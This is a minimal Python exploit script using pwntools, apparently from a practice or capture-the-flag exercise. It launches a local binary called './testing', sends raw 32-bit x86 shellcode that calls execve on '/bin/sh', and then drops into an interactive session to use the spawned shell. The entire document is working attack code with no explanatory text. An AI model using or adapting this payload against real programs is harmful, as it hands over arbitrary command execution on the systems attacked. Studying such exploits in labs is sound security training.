from pwn import *

p = process("./testing")

p.sendline(b"\x6a\x0b\x58\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80")
p.interactive()